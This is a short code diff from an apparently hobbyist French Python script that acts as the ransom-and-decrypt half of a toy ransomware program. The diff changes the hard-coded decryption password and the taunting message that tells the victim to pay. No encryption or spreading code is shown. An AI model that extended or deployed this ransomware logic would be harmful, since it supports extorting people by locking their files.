@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 
 #On a besoin d'un mot de passe pour decrypter
-mdp = "bon toutou"
+mdp = "iwantmydata"
 #Ce que doit trouver l'utilisateur
 mdp_input = input("Entrez le mot de passe pour décrypter vos données\n") 
 #Le mdp que l'utilisateur entre
@@ -41,4 +41,4 @@ if mdp == mdp_input:
   #La dernire ligne remplace le contenue du fichier  par data_decrypted
 	print("Merci d'avoir payé, vos fichiers sont maintenant décrypté")
 else:
-	print("Paye espece de rat :)")
+	print("Merci de payer, espece de rat :)")
